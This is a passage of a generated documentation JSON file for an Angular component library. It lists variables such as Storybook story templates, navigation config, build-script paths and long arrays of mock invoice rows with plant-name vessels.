                "defaultValue": "require('node-sass-tilde-importer')"
            },
            {
                "name": "items",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
                "type": "[]",
                "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
            },
            {
                "name": "manyColumns",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/rows.ts",
                "type": "[]",
                "defaultValue": "[...columns, ...columns, ...columns]"
            },
            {
                "name": "MultilineFooter",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "Story<Partial<StoDatatableComponent<Record<string, unknown>>>>",
                "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>The table takes in a list of footer rows</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\n} )"
            },
            {
                "name": "MultiSelect",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                "type": "Story<any>",
                "defaultValue": "(args) => ( {\n  props: { ...args }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field class=\"sto-form__field\"\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                         [selected]=\"select?.length\"\n                         [isFilter]=\"true\"\n                         [focusIfNoValue]=\"focusIfNoValue\"\n                         [isMulti]=\"true\"\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\n      <mat-option *ngFor=\"let opt of filteredItems\"\n                  [value]=\"opt\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
            },
            {
                "name": "navigation",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "object",
                "defaultValue": "{\n  'name': 'Web applications',\n  'groups': [\n    {\n      'name': 'Application 1',\n      'items': [\n        {\n          'id': 'a11',\n          'name': 'Application 1.1',\n          'svgIcon': false,\n          'icon': 'build',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a11'\n            ]\n          }\n        },\n        {\n          'id': 'a12',\n          'name': 'Application 1.2',\n          'svgIcon': false,\n          'icon': 'attach_money',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a12'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 2',\n      'external': false,\n      'items': [\n        {\n          'id': 'a2',\n          'name': 'Application 2',\n          'svgIcon': false,\n          'icon': 'train',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a2'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 3',\n      'items': [\n        {\n          'id': 'a3',\n          'name': 'Application 3',\n          'svgIcon': false,\n          'icon': 'local_library',\n          'command': {\n            'type': 'externalLinkNewWindow',\n            'arguments': []\n          }\n        }\n      ]\n    }\n  ]\n}"
            },
            {
                "name": "NAVIGATION_HOME_ICON",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "type": "",
                "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
            },
            {
                "name": "NormalUse",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "NormalUse",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable.stories.ts",
                "type": "Story<StoDatatableComponent<Record<string, unknown>>>",
                "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\n  return {\n    component: StoDatatableComponent,\n    props: {\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\n      rows: rows,\n      headerContextMenu: action('Header context menu'),\n      rowContextMenu: action('Row context menu'),\n      rowActivate: action('Keyboard-activation on row'),\n      select: action('Row selected'),\n      resized: action('Resize')\n    },\n  };\n}"
            },
            {
                "name": "NormalUse",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "NormalUse",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "NormalUse",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "out",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/build-scss.ts",
                "type": "",
                "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
            },
            {
                "name": "out",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/copy-assets.ts",
                "type": "",
                "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
            },
            {
                "name": "PADDING",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
                "type": "string",
                "defaultValue": "'000000000'"
            },
            {
                "name": "Paging",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "Story",
                "defaultValue": "(args) => ( {\n  props: args,\n  template: `\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\n<sto-datatable [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\n</sto-datatable>\n</mat-card>`\n} )"
            },
            {
                "name": "pipe",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/rows.ts",
                "type": "",
                "defaultValue": "new NumberFormatPipe()"
            },
            {
                "name": "preferenceKey",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                "type": "string",
                "defaultValue": "'TOPS_IM:UserPreferences'"
            },
            {
                "name": "preferences",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "type": "Preference[]",
                "defaultValue": "[\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\n]"
            },
            {
                "name": "primary",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "apps/oilmod-web/src/app/app.component.stories.ts",
                "type": "",
                "defaultValue": "() => ({\n  moduleMetadata: {\n    imports: []\n  },\n  props: {\n  }\n})"
            },
            {
                "name": "Primary",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "promises",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/build-scss.ts",
                "type": "[]",
                "defaultValue": "[\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\n]"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/test.ts",
                "type": "any"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/test.ts",
                "type": "any"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/test.ts",
                "type": "any"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/test.ts",
                "type": "any"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/test.ts",
                "type": "any"
            },
            {
                "name": "require",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/test.ts",
                "type": "any"
            },
            {
                "name": "ResponsiveMode",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "Story",
                "defaultValue": "(args) => ( {\n  props: args,\n  template: `\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\n<div [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\n<sto-datatable [virtualScroll]=\"true\"\n[responsiveBreakPoint]=\"breakpoint\"\n[responsive]=\"true\"\n[responsiveView]=\"responsive\"\n[height]=\"400\"\n[rows]=\"rows\"\n[columns]=\"columns\"></sto-datatable>\n<ng-template #responsive let-row=\"row\">{{ row | json }}</ng-template>\n</div>`\n} )"
            },
            {
                "name": "root",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/build-scss.ts",
                "type": "",
                "defaultValue": "path.join(__dirname, '../../')"
            },
            {
                "name": "root",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/copy-assets.ts",
                "type": "",
                "defaultValue": "path.join(__dirname, '../../')"
            },
            {
                "name": "rows",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/testing/utils.ts",
                "type": "[]",
                "defaultValue": "[\n  {\n    invoiceNo: 212666588,\n    voyageNo: 16206,\n    vesselName: 'False Cloak Fern',\n    allocated: 486958,\n    total: 367817\n  }, {\n    invoiceNo: 209381561,\n    voyageNo: 16897,\n    vesselName: 'Weak Signalgrass',\n    allocated: 435757,\n    total: 306822\n  }, {\n    invoiceNo: 276445387,\n    voyageNo: 16723,\n    vesselName: 'Southern Red Oak',\n    allocated: 434782,\n    total: 304761\n  }, {\n    invoiceNo: 240525031,\n    voyageNo: 17412,\n    vesselName: 'Hollyleaf Buckthorn',\n    allocated: 498118,\n    total: 518295\n  }, {\n    invoiceNo: 208251845,\n    voyageNo: 15732,\n    vesselName: 'Western Sandparsley',\n    allocated: 483548,\n    total: 409397\n  }, {\n    invoiceNo: 244864110,\n    voyageNo: 15313,\n    vesselName: 'Kern Buckwheat',\n    allocated: 413287,\n    total: 374936\n  }, {\n    invoiceNo: 213639557,\n    voyageNo: 17502,\n    vesselName: 'Greenleaf Manzanita',\n    allocated: 478124,\n    total: 362754\n  }, {\n    invoiceNo: 255930079,\n    voyageNo: 15029,\n    vesselName: 'Blue Skullcap',\n    allocated: 464448,\n    total: 483236\n  }, {\n    invoiceNo: 204028785,\n    voyageNo: 17325,\n    vesselName: 'Coca',\n    allocated: 412084,\n    total: 319574\n  }, {\n    invoiceNo: 215898267,\n    voyageNo: 17556,\n    vesselName: 'Fendler\\'s Pennycress',\n    allocated: 467666,\n    total: 401105\n  }, {\n    invoiceNo: 283652560,\n    voyageNo: 16693,\n    vesselName: 'Densespike Blazing Star',\n    allocated: 428117,\n    total: 422318\n  }, {\n    invoiceNo: 261627486,\n    voyageNo: 16742,\n    vesselName: 'Texas Crab Apple',\n    allocated: 445829,\n    total: 389401\n  }, {\n    invoiceNo: 224657257,\n    voyageNo: 17344,\n    vesselName: 'Philodendron',\n    allocated: 439503,\n    total: 197357\n  }, {\n    invoiceNo: 287799672,\n    voyageNo: 18559,\n    vesselName: 'Knife Acacia',\n    allocated: 457225,\n    total: 152586\n  }, {\n    invoiceNo: 249855102,\n    voyageNo: 17210,\n    vesselName: 'Catnip Noseburn',\n    allocated: 490793,\n    total: 295054\n  }, {\n    invoiceNo: 217932979,\n    voyageNo: 18294,\n    vesselName: 'Brickellbush Goldenweed',\n    allocated: 476987,\n    total: 90357\n  }, {\n    invoiceNo: 287187542,\n    voyageNo: 18123,\n    vesselName: 'Threecornerjack',\n    allocated: 436103,\n    total: 98431\n  }, {\n    invoiceNo: 277359566,\n    voyageNo: 17549,\n    vesselName: 'Longleaf Isodendrion',\n    allocated: 456456,\n    total: 292117\n  }, {\n    invoiceNo: 250935681,\n    voyageNo: 16429,\n    vesselName: 'Purple False Gilyflower',\n    allocated: 465653,\n    total: 396830\n  }, {\n    invoiceNo: 261927204,\n    voyageNo: 16524,\n    vesselName: 'Nevada Pea',\n    allocated: 411190,\n    total: 393332\n  }, {\n    invoiceNo: 203826163,\n    voyageNo: 17608,\n    vesselName: 'Alaska Tall Bluebells',\n    allocated: 487745,\n    total: 273514\n  }, {\n    invoiceNo: 253006185,\n    voyageNo: 17795,\n    vesselName: 'Cupped Monolopia',\n    allocated: 491265,\n    total: 117277\n  }, {\n    invoiceNo: 212369622,\n    voyageNo: 17867,\n    vesselName: 'Small Rocklettuce',\n    allocated: 408880,\n    total: 530690\n  }, {\n    invoiceNo: 259555515,\n    voyageNo: 16488,\n    vesselName: 'Torchwood',\n    allocated: 428843,\n    total: 63208\n  }, {\n    invoiceNo: 209064476,\n    voyageNo: 17957,\n    vesselName: 'Saline Saltbush',\n    allocated: 452602,\n    total: 144560\n  }, {\n    invoiceNo: 246761266,\n    voyageNo: 18253,\n    vesselName: 'White Snakeroot',\n    allocated: 485075,\n    total: 133101\n  }, {\n    invoiceNo: 277989052,\n    voyageNo: 15535,\n    vesselName: 'Bayberry',\n    allocated: 411595,\n    total: 549473\n  }, {\n    invoiceNo: 246327302,\n    voyageNo: 17427,\n    vesselName: 'China Violet',\n    allocated: 426753,\n    total: 406017\n  }, {\n    invoiceNo: 225951335,\n    voyageNo: 15473,\n    vesselName: 'Olympic Saxifrage',\n    allocated: 429650,\n    total: 413380\n  }, {\n    invoiceNo: 206579573,\n    voyageNo: 17600,\n    vesselName: 'False Sun-rose',\n    allocated: 464983,\n    total: 474611\n  }, {\n    invoiceNo: 243806520,\n    voyageNo: 15148,\n    vesselName: 'Bracted Lousewort',\n    allocated: 486907,\n    total: 419416\n  }, {\n    invoiceNo: 248037555,\n    voyageNo: 16554,\n    vesselName: 'Beach Strawberry',\n    allocated: 446762,\n    total: 543982\n  }, {\n    invoiceNo: 233807782,\n    voyageNo: 18251,\n    vesselName: 'Western Bog Yellowcress',\n    allocated: 485749,\n    total: 206612\n  }, {\n    invoiceNo: 231399318,\n    voyageNo: 18647,\n    vesselName: 'Nevada Pea',\n    allocated: 416624,\n    total: 73797\n  }, {\n    invoiceNo: 210265421,\n    voyageNo: 17334,\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\n    allocated: 493556,\n    total: 485404\n  }, {\n    invoiceNo: 270110020,\n    voyageNo: 15750,\n    vesselName: 'Dotted Lancepod',\n    allocated: 439009,\n    total: 85163\n  }, {\n    invoiceNo: 203365491,\n    voyageNo: 15574,\n    vesselName: 'Arizona Whitefeather',\n    allocated: 424981,\n    total: 72976\n  }, {\n    invoiceNo: 258026382,\n    voyageNo: 17991,\n    vesselName: 'Rough Blackfoot',\n    allocated: 412805,\n    total: 525915\n  }, {\n    invoiceNo: 216800989,\n    voyageNo: 18938,\n    vesselName: 'Narrowleaf Wirelettuce',\n    allocated: 437679,\n    total: 384426\n  }, {\n    invoiceNo: 224161270,\n    voyageNo: 15475,\n    vesselName: 'Utah Sweetvetch',\n    allocated: 414735,\n    total: 398700\n  }, {\n    invoiceNo: 224587536,\n    voyageNo: 16133,\n    vesselName: 'Palau Horsfieldia',\n    allocated: 409836,\n    total: 55599\n  }, {\n    invoiceNo: 200019644,\n    voyageNo: 16430,\n    vesselName: 'Cracked Lichen',\n    allocated: 491135,\n    total: 400179\n  }, {\n    invoiceNo: 212973644,\n    voyageNo: 16527,\n    vesselName: 'California Valerian',\n    allocated: 465742,\n    total: 428281\n  }, {\n    invoiceNo: 236726871,\n    voyageNo: 15145,\n    vesselName: 'Spear Saltbush',\n    allocated: 420067,\n    total: 236753\n  }, {\n    invoiceNo: 262498296,\n    voyageNo: 16350,\n    vesselName: 'Rose Globemallow',\n    allocated: 472387,\n    total: 270655\n  }, {\n    invoiceNo: 237959767,\n    voyageNo: 18739,\n    vesselName: 'Cithara Buckwheat',\n    allocated: 447466,\n    total: 358262\n  }, {\n    invoiceNo: 200461954,\n    voyageNo: 18921,\n    vesselName: 'Rough Potato',\n    allocated: 425594,\n    total: 459497\n  }, {\n    invoiceNo: 266033549,\n    voyageNo: 16150,\n    vesselName: 'Distictis',\n    allocated: 447636,\n    total: 286350\n  }, {\n    invoiceNo: 289893009,\n    voyageNo: 18219,\n    vesselName: 'Piedmont False Pimpernel',\n    allocated: 474098,\n    total: 163688\n  }, {\n    invoiceNo: 241320630,\n    voyageNo: 15558,\n    vesselName: 'Southern Mexican Sage',\n    allocated: 431537,\n    total: 419734\n  }, {\n    invoiceNo: 211404482,\n    voyageNo: 18502,\n    vesselName: 'Bearded Sprangletop',\n    allocated: 458939,\n    total: 89714\n  }, {\n    invoiceNo: 247917426,\n    voyageNo: 18238,\n    vesselName: 'Small-flowered Calycadenia',\n    allocated: 406198,\n    total: 351785\n  }, {\n    invoiceNo: 234633032,\n    voyageNo: 17269,\n    vesselName: 'Pritchardia',\n    allocated: 442188,\n    total: 414638\n  }, {\n    invoiceNo: 216477974,\n    voyageNo: 15454,\n    vesselName: 'Thread Lichen',\n    allocated: 474232,\n    total: 537142\n  }, {\n    invoiceNo: 201667786,\n    voyageNo: 15130,\n    vesselName: 'Margined Stickseed',\n    allocated: 493253,\n    total: 364145\n  }, {\n    invoiceNo: 271891491,\n    voyageNo: 15468,\n    vesselName: 'Eggleaf Milkwort',\n    allocated: 457747,\n    total: 316780\n  }, {\n    invoiceNo: 223744528,\n    voyageNo: 16074,\n    vesselName: 'Hall\\'s Mule-ears',\n    allocated: 439241,\n    total: 301239\n  }, {\n    invoiceNo: 202936481,\n    voyageNo: 18868,\n    vesselName: 'Rinodina Lichen',\n    allocated: 488291,\n    total: 504547\n  }, {\n    invoiceNo: 284610720,\n    voyageNo: 17077,\n    vesselName: 'Saber Bogmat',\n    allocated: 417817,\n    total: 246511\n  }, {\n    invoiceNo: 286535852,\n    voyageNo: 15935,\n    vesselName: 'Brodiaea',\n    allocated: 479989,\n    total: 276206\n  }, {\n    invoiceNo: 206000446,\n    voyageNo: 17528,\n    vesselName: 'Utah Serviceberry',\n    allocated: 454837,\n    total: 399887\n  }, {\n    invoiceNo: 283036494,\n    voyageNo: 16899,\n    vesselName: 'Lehua Makanoe',\n    allocated: 452547,\n    total: 96023\n  }, {\n    invoiceNo: 270371913,\n    voyageNo: 16886,\n    vesselName: 'Rim Lichen',\n    allocated: 439082,\n    total: 269557\n  }, {\n    invoiceNo: 273513209,\n    voyageNo: 15570,\n    vesselName: 'Andrews\\' Rhizomnium Moss',\n    allocated: 471494,\n    total: 131750\n  }, {\n    invoiceNo: 215244773,\n    voyageNo: 17618,\n    vesselName: 'Lesser Pond Sedge',\n    allocated: 472422,\n    total: 505921\n  }, {\n    invoiceNo: 264815411,\n    voyageNo: 17008,\n    vesselName: 'Browne\\'s Savory',\n    allocated: 464834,\n    total: 420180\n  }, {\n    invoiceNo: 260793904,\n    voyageNo: 18868,\n    vesselName: 'Bastard Copperleaf',\n    allocated: 403983,\n    total: 190831\n  }, {\n    invoiceNo: 228919503,\n    voyageNo: 16736,\n    vesselName: 'Himalayan Cypress',\n    allocated: 418664,\n    total: 450233\n  }, {\n    invoiceNo: 225534860,\n    voyageNo: 18374,\n    vesselName: 'Fiddleleaf Hawksbeard',\n    allocated: 495477,\n    total: 528500\n  }, {\n    invoiceNo: 205039289,\n    voyageNo: 15221,\n    vesselName: 'Maui Cyanea',\n    allocated: 434081,\n    total: 79021\n  }, {\n    invoiceNo: 219730920,\n    voyageNo: 18931,\n    vesselName: 'Garden Sorrel',\n    allocated: 442584,\n    total: 193166\n  }, {\n    invoiceNo: 229994865,\n    voyageNo: 16404,\n    vesselName: 'Waialeale Dubautia',\n    allocated: 414377,\n    total: 195495\n  }, {\n    invoiceNo: 289807557,\n    voyageNo: 16151,\n    vesselName: 'Onetooth Woodfern',\n    allocated: 415673,\n    total: 202974\n  }, {\n    invoiceNo: 289750833,\n    voyageNo: 15827,\n    vesselName: 'Greenland Orange Lichen',\n    allocated: 416432,\n    total: 146021\n  }, {\n    invoiceNo: 243948439,\n    voyageNo: 18154,\n    vesselName: 'Leafy Reedgrass',\n    allocated: 441439,\n    total: 248631\n  }, {\n    invoiceNo: 266718010,\n    voyageNo: 15322,\n    vesselName: 'Largeleaf Marshpennywort',\n    allocated: 436736,\n    total: 256997\n  }, {\n    invoiceNo: 285338933,\n    voyageNo: 18884,\n    vesselName: 'Musk Okra',\n    allocated: 414918,\n    total: 475276\n  }, {\n    invoiceNo: 284544908,\n    voyageNo: 16825,\n    vesselName: 'Stegonia Moss',\n    allocated: 486396,\n    total: 210718\n  }, {\n    invoiceNo: 200951860,\n    voyageNo: 15681,\n    vesselName: 'Black Rock Townsend Daisy',\n    allocated: 437133,\n    total: 358340\n  }, {\n    invoiceNo: 248838992,\n    voyageNo: 18254,\n    vesselName: 'Kern Canyon Clarkia',\n    allocated: 414245,\n    total: 164454\n  }, {\n    invoiceNo: 274109340,\n    voyageNo: 18252,\n    vesselName: 'Squarrose Knapweed',\n    allocated: 408814,\n    total: 159690\n  }, {\n    invoiceNo: 219721177,\n    voyageNo: 16331,\n    vesselName: 'Lake County Dwarf-flax',\n    allocated: 496150,\n    total: 404922\n  }, {\n    invoiceNo: 272212685,\n    voyageNo: 15395,\n    vesselName: 'Ferngrass',\n    allocated: 432853,\n    total: 191127\n  }, {\n    invoiceNo: 243182762,\n    voyageNo: 18321,\n    vesselName: 'Marsh Grass',\n    allocated: 462472,\n    total: 452940\n  }, {\n    invoiceNo: 277839539,\n    voyageNo: 17421,\n    vesselName: 'Prairie Straw Sedge',\n    allocated: 406837,\n    total: 271284\n  }, {\n    invoiceNo: 207952597,\n    voyageNo: 17197,\n    vesselName: 'Doublehorn Calicoflower',\n    allocated: 477735,\n    total: 400959\n  }, {\n    invoiceNo: 260636315,\n    voyageNo: 15453,\n    vesselName: 'Palmer\\'s Goldenrod',\n    allocated: 450419,\n    total: 309897\n  }, {\n    invoiceNo: 256449906,\n    voyageNo: 15189,\n    vesselName: 'Oregon Checkerbloom',\n    allocated: 435139,\n    total: 139814\n  }, {\n    invoiceNo: 230023430,\n    voyageNo: 15665,\n    vesselName: 'Duckweed',\n    allocated: 449282,\n    total: 209512\n  }, {\n    invoiceNo: 226217229,\n    voyageNo: 18462,\n    vesselName: 'Disc Lichen',\n    allocated: 471214,\n    total: 58962\n  }, {\n    invoiceNo: 239201753,\n    voyageNo: 18676,\n    vesselName: 'Antifever Fontinalis Moss',\n    allocated: 456585,\n    total: 146024\n  }, {\n    invoiceNo: 235303844,\n    voyageNo: 16223,\n    vesselName: 'Miracle Fruit',\n    allocated: 467877,\n    total: 150931\n  }, {\n    invoiceNo: 217943418,\n    voyageNo: 15418,\n    vesselName: 'Little Gumweed',\n    allocated: 494402,\n    total: 355363\n  }, {\n    invoiceNo: 289788898,\n    voyageNo: 15038,\n    vesselName: 'Parish\\'s Oxytheca',\n    allocated: 464853,\n    total: 472823\n  }, {\n    invoiceNo: 280499130,\n    voyageNo: 18914,\n    vesselName: 'Jelly Lichen',\n    allocated: 486477,\n    total: 522679\n  }, {\n    invoiceNo: 223812339,\n    voyageNo: 18298,\n    vesselName: 'Evermann\\'s Fleabane',\n    allocated: 453418,\n    total: 50034\n  }, {\n    invoiceNo: 226331833,\n    voyageNo: 17046,\n    vesselName: 'Munj Sweetcane',\n    allocated: 442239,\n    total: 447072\n  }, {\n    invoiceNo: 226842057,\n    voyageNo: 16491,\n    vesselName: 'Trichostomum Moss',\n    allocated: 450732,\n    total: 471203\n  }, {\n    invoiceNo: 218377093,\n    voyageNo: 18157,\n    vesselName: 'Brown Stringybark',\n    allocated: 441668,\n    total: 464837\n  }, {\n    invoiceNo: 282690677,\n    voyageNo: 16864,\n    vesselName: 'Whorled Milkwort',\n    allocated: 424456,\n    total: 241177\n  } ]"
            },
            {
                "name": "rows",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/rows.ts",
                "type": "",
                "defaultValue": "[\n  {\n    'invoiceNo': 212666588,\n    'voyageNo': 16206,\n    'vesselName': 'False Cloak Fern',\n    'allocated': 486958,\n    'total': 367817\n}, {\n    'invoiceNo': 209381561,\n    'voyageNo': 16897,\n    'vesselName': 'Weak Signalgrass',\n    'allocated': 435757,\n    'total': 306822\n}, {\n    'invoiceNo': 276445387,\n    'voyageNo': 16723,\n    'vesselName': 'Southern Red Oak',\n    'allocated': 434782,\n    'total': 304761\n}, {\n    'invoiceNo': 240525031,\n    'voyageNo': 17412,\n    'vesselName': 'Hollyleaf Buckthorn',\n    'allocated': 498118,\n    'total': 518295\n}, {\n    'invoiceNo': 208251845,\n    'voyageNo': 15732,\n    'vesselName': 'Western Sandparsley',\n    'allocated': 483548,\n    'total': 409397\n}, {\n    'invoiceNo': 244864110,\n    'voyageNo': 15313,\n    'vesselName': 'Kern Buckwheat',\n    'allocated': 413287,\n    'total': 374936\n}, {\n    'invoiceNo': 213639557,\n    'voyageNo': 17502,\n    'vesselName': 'Greenleaf Manzanita',\n    'allocated': 478124,\n    'total': 362754\n}, {\n    'invoiceNo': 255930079,\n    'voyageNo': 15029,\n    'vesselName': 'Blue Skullcap',\n    'allocated': 464448,\n    'total': 483236\n}, {\n    'invoiceNo': 204028785,\n    'voyageNo': 17325,\n    'vesselName': 'Coca',\n    'allocated': 412084,\n    'total': 319574\n}, {\n    'invoiceNo': 215898267,\n    'voyageNo': 17556,\n    'vesselName': 'Fendler\\'s Pennycress',\n    'allocated': 467666,\n    'total': 401105\n}, {\n    'invoiceNo': 283652560,\n    'voyageNo': 16693,\n    'vesselName': 'Densespike Blazing Star',\n    'allocated': 428117,\n    'total': 422318\n}, {\n    'invoiceNo': 261627486,\n    'voyageNo': 16742,\n    'vesselName': 'Texas Crab Apple',\n    'allocated': 445829,\n    'total': 389401\n}, {\n    'invoiceNo': 224657257,\n    'voyageNo': 17344,\n    'vesselName': 'Philodendron',\n    'allocated': 439503,\n    'total': 197357\n}, {\n    'invoiceNo': 287799672,\n    'voyageNo': 18559,\n    'vesselName': 'Knife Acacia',\n    'allocated': 457225,\n    'total': 152586\n}, {\n    'invoiceNo': 249855102,\n    'voyageNo': 17210,\n    'vesselName': 'Catnip Noseburn',\n    'allocated': 490793,\n    'total': 295054\n}, {\n    'invoiceNo': 217932979,\n    'voyageNo': 18294,\n    'vesselName': 'Brickellbush Goldenweed',\n    'allocated': 476987,\n    'total': 90357\n}, {\n    'invoiceNo': 287187542,\n    'voyageNo': 18123,\n    'vesselName': 'Threecornerjack',\n    'allocated': 436103,\n    'total': 98431\n}, {\n    'invoiceNo': 277359566,\n    'voyageNo': 17549,\n    'vesselName': 'Longleaf Isodendrion',\n    'allocated': 456456,\n    'total': 292117\n}, {\n    'invoiceNo': 250935681,\n    'voyageNo': 16429,\n    'vesselName': 'Purple False Gilyflower',\n    'allocated': 465653,\n    'total': 396830\n}, {\n    'invoiceNo': 261927204,\n    'voyageNo': 16524,\n    'vesselName': 'Nevada Pea',\n    'allocated': 411190,\n    'total': 393332\n}, {\n    'invoiceNo': 203826163,\n    'voyageNo': 17608,\n    'vesselName': 'Alaska Tall Bluebells',\n    'allocated': 487745,\n    'total': 273514\n}, {\n    'invoiceNo': 253006185,\n    'voyageNo': 17795,\n    'vesselName': 'Cupped Monolopia',\n    'allocated': 491265,\n    'total': 117277\n}, {\n    'invoiceNo': 212369622,\n    'voyageNo': 17867,\n    'vesselName': 'Small Rocklettuce',\n    'allocated': 408880,\n    'total': 530690\n}, {\n    'invoiceNo': 259555515,\n    'voyageNo': 16488,\n    'vesselName': 'Torchwood',\n    'allocated': 428843,\n    'total': 63208\n}, {\n    'invoiceNo': 209064476,\n    'voyageNo': 17957,\n    'vesselName': 'Saline Saltbush',\n    'allocated': 452602,\n    'total': 144560\n}, {\n    'invoiceNo': 246761266,\n    'voyageNo': 18253,\n    'vesselName': 'White Snakeroot',\n    'allocated': 485075,\n    'total': 133101\n}, {\n    'invoiceNo': 277989052,\n    'voyageNo': 15535,\n    'vesselName': 'Bayberry',\n   